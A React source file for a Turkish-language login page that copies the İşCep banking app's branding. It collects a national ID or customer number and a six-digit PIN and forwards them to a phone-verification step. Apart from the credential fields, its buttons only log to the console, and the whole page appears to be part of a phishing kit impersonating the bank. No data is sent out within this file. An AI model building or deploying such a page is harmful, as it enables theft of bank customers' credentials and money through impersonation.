import React, { useEffect, useRef, useCallback, memo } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import './App.css';
import { useAuth } from './AuthContext';

function LoginPage() {
  const { state, dispatch } = useAuth();
  const { inputValue = '', passwordValue = '' } = state || {};
  const passwordInputRef = useRef(null);
  const tcInputRef = useRef(null);
  const navigate = useNavigate();
  const location = useLocation();

  const [localState, setLocalState] = React.useState({
    isTcActive: inputValue.length > 0,
    isActive: passwordValue.length > 0,
    isTcBold: inputValue.length > 0,
    showTcError: false,
  });

  // Debounce yardımcı fonksiyonu
  const debounce = (func, delay) => {
    let timer;
    return (...args) => {
      clearTimeout(timer);
      timer = setTimeout(() => func(...args), delay);
    };
  };

  useEffect(() => {
    if (location.state?.fromPhoneVerification) {
      window.history.replaceState(null, '', '/giris');
      navigate('/giris', { replace: true });
    }
    if (inputValue.length === 11 && passwordInputRef.current) {
      passwordInputRef.current.focus();
    }
  }, [inputValue, location.state, navigate]);

  // Meta tag ve Virtual Keyboard API ekleme (klavye sorunu için)
  useEffect(() => {
    const meta = document.createElement('meta');
    meta.name = 'viewport';
    meta.content = 'width=device-width, initial-scale=1.0, interactive-widget=resizes-content, virtual-keyboard=overlays-content';
    document.head.appendChild(meta);

    if ("virtualKeyboard" in navigator) {
      navigator.virtualKeyboard.overlaysContent = true;
    }

    return () => {
      document.head.removeChild(meta);
    };
  }, []);

  // Scroll optimizasyonu: TC ve şifre inputlarına focus olduğunda butonu görünür kıl
  useEffect(() => {
    const tcRef = tcInputRef.current;
    const passwordRef = passwordInputRef.current;

    const handleFocusScroll = (inputType) => {
      const isAndroid = /Android/i.test(navigator.userAgent);
      const isSamsung = /Samsung/i.test(navigator.userAgent);
      const isOppo = /OPPO/i.test(navigator.userAgent);

      if (!isAndroid) return;

      const delay = (isSamsung || isOppo) ? 1500 : 1000;

      const adjustScroll = debounce(() => {
        requestAnimationFrame(() => {
          const rightSection = document.querySelector('.right-section');
          const continueButton = document.querySelector('.continue-button');
          if (!rightSection || !continueButton) return;

          const viewportHeight = window.visualViewport?.height || window.innerHeight;
          const keyboardHeight = window.innerHeight - viewportHeight;

          rightSection.style.height = `${viewportHeight}px`;
          rightSection.style.paddingBottom = `${keyboardHeight}px`;

          continueButton.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
        });
      }, 50);

      setTimeout(adjustScroll, delay);

      const handleViewportChange = () => adjustScroll();
      if (window.visualViewport) {
        window.visualViewport.addEventListener('resize', handleViewportChange);
        window.visualViewport.addEventListener('scroll', handleViewportChange);
      }

      return () => {
        if (window.visualViewport) {
          window.visualViewport.removeEventListener('resize', handleViewportChange);
          window.visualViewport.removeEventListener('scroll', handleViewportChange);
        }
      };
    };

    const handleTcFocusScroll = () => handleFocusScroll('TC');
    const handlePasswordFocusScroll = () => handleFocusScroll('Password');

    if (tcRef) {
      tcRef.addEventListener('focus', handleTcFocusScroll);
    }
    if (passwordRef) {
      passwordRef.addEventListener('focus', handlePasswordFocusScroll);
    }

    const handleBlurScroll = () => {
      const rightSection = document.querySelector('.right-section');
      if (rightSection) {
        rightSection.style.height = '100vh';
        rightSection.style.paddingBottom = '0';
        rightSection.scrollTo({ top: 0, behavior: 'smooth' });
      }
    };

    if (tcRef) {
      tcRef.addEventListener('blur', handleBlurScroll);
    }
    if (passwordRef) {
      passwordRef.addEventListener('blur', handleBlurScroll);
    }

    return () => {
      if (tcRef) {
        tcRef.removeEventListener('focus', handleTcFocusScroll);
        tcRef.removeEventListener('blur', handleBlurScroll);
      }
      if (passwordRef) {
        passwordRef.removeEventListener('focus', handlePasswordFocusScroll);
        passwordRef.removeEventListener('blur', handleBlurScroll);
      }
    };
  }, []);

  const handleNumberInput = useCallback(
    (e, type, maxLength) => {
      const value = e.target.value;
      if (/^\d*$/.test(value) && value.length <= maxLength) {
        dispatch({ type, payload: value });
        setLocalState((prev) => ({
          ...prev,
          ...(type === 'SET_INPUT_VALUE'
            ? { isTcActive: true, isTcBold: value.length > 0, showTcError: false }
            : { isActive: true, showTcError: false }),
        }));
      }
    },
    [dispatch]
  );

  const handleTcKeyDown = useCallback((e) => {
    if ((e.key === 'Backspace' || e.key === 'Delete') && !e.target.value) {
      setLocalState((prev) => ({
        ...prev,
        isTcBold: false,
        isTcActive: true,
      }));
    }
  }, []);

  const handleClearTc = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_TC' });
      setLocalState((prev) => ({
        ...prev,
        isTcActive: true,
        isTcBold: false,
        showTcError: false,
      }));
      tcInputRef.current?.focus();
    },
    [dispatch]
  );

  const handleClearPassword = useCallback(
    (e) => {
      e.stopPropagation();
      dispatch({ type: 'CLEAR_PASSWORD' });
      setLocalState((prev) => ({
        ...prev,
        isActive: true,
        showTcError: false,
      }));
      passwordInputRef.current?.focus();
    },
    [dispatch]
  );

  const handleTcFocus = useCallback(() => {
    setLocalState((prev) => ({
      ...prev,
      isTcActive: true,
      isTcBold: inputValue.length > 0,
    }));
  }, [inputValue]);

  const handleTcBlur = useCallback(() => {
    if (!inputValue.length) {
      setLocalState((prev) => ({
        ...prev,
        isTcActive: false,
        isTcBold: false,
      }));
    }
  }, [inputValue]);

  const handlePasswordFocus = useCallback(() => {
    setLocalState((prev) => ({ ...prev, isActive: true }));
  }, []);

  const handlePasswordBlur = useCallback(
    (e) => {
      const isClearButton = e.relatedTarget?.classList.contains('clear-password-button');
      if (!passwordValue.length && !isClearButton) {
        setLocalState((prev) => ({ ...prev, isActive: false }));
      }
    },
    [passwordValue]
  );

  const handleContinueClick = useCallback(() => {
    if (inputValue.length > 0 && inputValue.length !== 11) {
      setLocalState((prev) => ({ ...prev, showTcError: true }));
      return;
    }
    if (inputValue.length === 11 && passwordValue.length === 6) {
      navigate('/telefon', {
        state: { tc: inputValue, password: passwordValue, isValidNavigation: true },
        replace: true,
      });
    }
  }, [inputValue, passwordValue, navigate]);

  const handleFormSubmit = useCallback(
    (e) => {
      e.preventDefault();
      e.stopPropagation();
      handleContinueClick();
      if (document.activeElement) {
        document.activeElement.blur();
      }
    },
    [handleContinueClick]
  );

  return (
    <form onSubmit={handleFormSubmit} style={{ touchAction: 'manipulation' }}>
      <div className="container">
        <div className="right-section">
          <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo" loading="lazy" />
          <div className="user-icon">
            <img src="/user.png" alt="Kullanıcı Simgesi" loading="lazy" />
          </div>
          <div className="new-container">
            Yeni Kullanıcı
            <div className="down-arrow">
              <img src="/down-arrow.png" alt="Aşağı Ok" className="down-arrow-img" loading="lazy" />
            </div>
          </div>
          <div className="new-lower-container">Bireysel</div>
          <div className="input-wrapper">
            <div
              className={`tc-input-wrapper ${localState.showTcError ? 'error' : ''}`}
              onClick={() => tcInputRef.current?.focus()}
            >
              <label
                className={`tc-label ${localState.isTcActive ? 'hovered' : ''}`}
                htmlFor="tc-input"
              >
                Müşteri Numarası /{' '}
                <span className={`tc-label-part ${localState.isTcBold ? 'bold' : ''}`}>
                  TCKN-YKN
                </span>
              </label>
              <input
                id="tc-input"
                ref={tcInputRef}
                type="tel"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength="11"
                value={inputValue}
                onChange={(e) => handleNumberInput(e, 'SET_INPUT_VALUE', 11)}
                onFocus={handleTcFocus}
                onBlur={handleTcBlur}
                onKeyDown={handleTcKeyDown}
                className={`new-input tc-input ${localState.showTcError ? 'error' : ''}`}
                autoComplete="off"
                autoCapitalize="none"
                aria-describedby="tc-error"
                aria-label="Müşteri Numarası veya TCKN-YKN"
              />
              {inputValue.length > 0 && (
                <button
                  className="clear-tc-button"
                  type="button"
                  onClick={handleClearTc}
                  onTouchStart={handleClearTc}
                  aria-label="TCKN-YKN’yi temizle"
                >
                  ✕
                </button>
              )}
              {localState.showTcError && (
                <div id="tc-error" className="tc-error" role="alert" aria-live="assertive">
                  <img
                    src="/error.png"
                    alt="Hata Simgesi"
                    className="error-icon"
                    loading="lazy"
                    onError={() => console.warn('Hata simgesi yüklenemedi')}
                  />
                  Hatalı giriş yaptınız, lütfen tekrar deneyiniz.
                </div>
              )}
            </div>
            <div
              className={`action-links ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
            >
              <button
                className="action-link become-customer"
                type="button"
                onClick={() => console.log('Müşteri Olmak İstiyorum tıklandı')}
              >
                MÜŞTERİ OLMAK İSTİYORUM
              </button>
              <button
                className="action-link create-password"
                type="button"
                onClick={() => console.log('Şifre Oluştur tıklandı')}
              >
                ŞİFRE OLUŞTUR
              </button>
            </div>
            {inputValue.length === 11 && (
              <div className="password-input-wrapper">
                <label
                  className={`password-label ${localState.isActive ? 'hovered' : ''}`}
                  htmlFor="password-input"
                >
                  Şifre
                </label>
                <div className="password-input-container">
                  <input
                    id="password-input"
                    ref={passwordInputRef}
                    type="password"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    maxLength="6"
                    value={passwordValue}
                    onChange={(e) => handleNumberInput(e, 'SET_PASSWORD_VALUE', 6)}
                    onFocus={handlePasswordFocus}
                    onBlur={handlePasswordBlur}
                    className={`new-input password-input ${
                      inputValue.length === 11 ? 'no-right-line' : ''
                    }`}
                    autoComplete="new-password"
                    autoCapitalize="none"
                    aria-describedby="password-error"
                    aria-label="Şifre"
                  />
                  {passwordValue.length > 0 && (
                    <button
                      className="clear-password-button"
                      type="button"
                      onClick={handleClearPassword}
                      onTouchStart={handleClearPassword}
                      aria-label="Şifreyi temizle"
                    >
                      ✕
                    </button>
                  )}
                </div>
                {(passwordValue.length > 0 || localState.isActive) && (
                  <div className="password-overlay">
                    <span className="dots">
                      {[...Array(6)].map((_, index) => (
                        <span
                          key={index}
                          className={`dot ${index < passwordValue.length ? '' : 'inactive'}`}
                        />
                      ))}
                    </span>
                  </div>
                )}
              </div>
            )}
            <button
              type="submit"
              className={`continue-button ${
                inputValue.length > 0 &&
                (inputValue.length < 11 || (inputValue.length === 11 && passwordValue.length === 6))
                  ? 'active-continue-button'
                  : ''
              } ${inputValue.length === 11 ? 'shifted' : ''} ${
                localState.showTcError ? 'error-shifted' : ''
              }`}
              onClick={handleContinueClick}
              disabled={inputValue.length === 0 || (inputValue.length === 11 && passwordValue.length !== 6)}
              aria-label="Devam et"
            >
              Devam
            </button>
          </div>
        </div>
      </div>
    </form>
  );
}

export default memo(LoginPage);
